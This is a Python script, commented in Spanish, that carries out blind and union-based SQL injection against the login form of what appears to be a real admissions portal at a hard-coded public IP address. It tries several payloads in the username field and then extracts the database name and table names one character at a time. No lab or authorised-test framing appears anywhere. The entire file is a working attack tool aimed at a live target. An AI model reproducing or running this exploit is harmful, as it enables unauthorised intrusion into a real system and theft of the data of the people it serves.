import requests
import urllib3
import html
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdaptiveSQLInjector:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def analyze_application_behavior(self):
        """Analiza el comportamiento específico de la aplicación"""
        print("[*] Analizando comportamiento de la aplicación...")
        
        # Probar diferentes enfoques de SQL Injection
        test_payloads = [
            # Enfoque 1: Union simple
            {"payload": "admin' UNION SELECT 'TEST1','TEST2','TEST3'--", "description": "Union básico"},
            
            # Enfoque 2: Concatenación
            {"payload": "admin' UNION SELECT CONCAT('DB:',database()),'TEST','TEST'--", "description": "Concat database"},
            
            # Enfoque 3: Sin union
            {"payload": "admin' AND 1=1--", "description": "AND condition"},
            
            # Enfoque 4: Error-based
            {"payload": "admin' AND EXTRACTVALUE(1,CONCAT(0x3a,database()))--", "description": "Error-based"},
            
            # Enfoque 5: Boolean-based blind
            {"payload": "admin' AND database() LIKE '%'--", "description": "Boolean blind"},
        ]
        
        for test in test_payloads:
            try:
                form_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': test['payload'],
                    'xContrasena': 'x'
                }
                
                print(f"\n[*] Probando: {test['description']}")
                print(f"    Payload: {test['payload'][:50]}...")
                
                response = self.session.post(self.base_url, data=form_data, timeout=10)
                
                # Analizar diferencias en la respuesta
                if "Solicita Ficha de Admisión" in response.text:
                    print("    [+] Comportamiento normal - muestra 'Solicita Ficha de Admisión'")
                else:
                    print("    [!] Comportamiento diferente detectado")
                    print(f"    Tamaño respuesta: {len(response.text)}")
                    
                    # Buscar diferencias específicas
                    if "TEST" in response.text:
                        print("    [!] ¡Payload ejecutado! 'TEST' encontrado en respuesta")
                    
                    # Guardar respuesta diferente
                    filename = f"diff_response_{test['description'].replace(' ', '_')}.html"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    print(f"    [+] Respuesta guardada en {filename}")
                    
            except Exception as e:
                print(f"    [-] Error: {e}")

    def extract_data_using_blind_techniques(self):
        """Usa técnicas de SQL Injection ciego"""
        print("\n[*] Usando técnicas de inyección ciega...")
        
        # Extraer nombre de la base de datos carácter por carácter
        db_name = ""
        characters = "abcdefghijklmnopqrstuvwxyz0123456789_"
        
        print("[*] Extrayendo nombre de la base de datos...")
        
        for position in range(1, 20):  # Primero 20 caracteres
            found_char = None
            
            for char in characters:
                payload = f"admin' AND SUBSTRING(database(),{position},1)='{char}'--"
                
                form_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': payload,
                    'xContrasena': 'x'
                }
                
                try:
                    response = self.session.post(self.base_url, data=form_data, timeout=8)
                    
                    # Si la respuesta es diferente (no muestra el mensaje normal)
                    if "Solicita Ficha de Admisión" not in response.text:
                        found_char = char
                        break
                        
                except:
                    pass
            
            if found_char:
                db_name += found_char
                print(f"    Carácter {position}: {found_char} -> Base de datos: {db_name}")
            else:
                print(f"    [-] No se pudo determinar el carácter en posición {position}")
                break
        
        if db_name:
            print(f"[!] Nombre de la base de datos: {db_name}")
            return db_name
        else:
            print("[-] No se pudo extraer el nombre de la base de datos")
            return None

    def extract_table_names(self, db_name):
        """Extrae nombres de tablas usando inyección ciega"""
        if not db_name:
            return
        
        print(f"\n[*] Extrayendo tablas de la base de datos {db_name}...")
        
        # Primero obtener cantidad de tablas
        table_count = 0
        for i in range(1, 50):
            payload = f"admin' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}')={i}--"
            
            form_data = {
                'yAccion': 'login',
                'yIntentos': '1',
                'yUsuario': '',
                'xUsuario': payload,
                'xContrasena': 'x'
            }
            
            try:
                response = self.session.post(self.base_url, data=form_data, timeout=8)
                if "Solicita Ficha de Admisión" not in response.text:
                    table_count = i
                    break
            except:
                pass
        
        print(f"[+] Número de tablas: {table_count}")
        
        # Extraer nombres de tablas
        for table_num in range(table_count):
            table_name = ""
            
            for position in range(1, 50):
                found_char = None
                
                for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
                    payload = f"admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {table_num},1),{position},1))=ASCII('{char}')--"
                    
                    form_data = {
                        'yAccion': 'login',
                        'yIntentos': '1',
                        'yUsuario': '',
                        'xUsuario': payload,
                        'xContrasena': 'x'
                    }
                    
                    try:
                        response = self.session.post(self.base_url, data=form_data, timeout=8)
                        if "Solicita Ficha de Admisión" not in response.text:
                            found_char = char
                            break
                    except:
                        pass
                
                if found_char:
                    table_name += found_char
                else:
                    break
            
            if table_name:
                print(f"    Tabla {table_num + 1}: {table_name}")

# Ejecutar inyector adaptativo
print("=== SQL INJECTION ADAPTATIVO ===")
injector = AdaptiveSQLInjector("189.254.143.102")
injector.analyze_application_behavior()
db_name = injector.extract_data_using_blind_techniques()
injector.extract_table_names(db_name)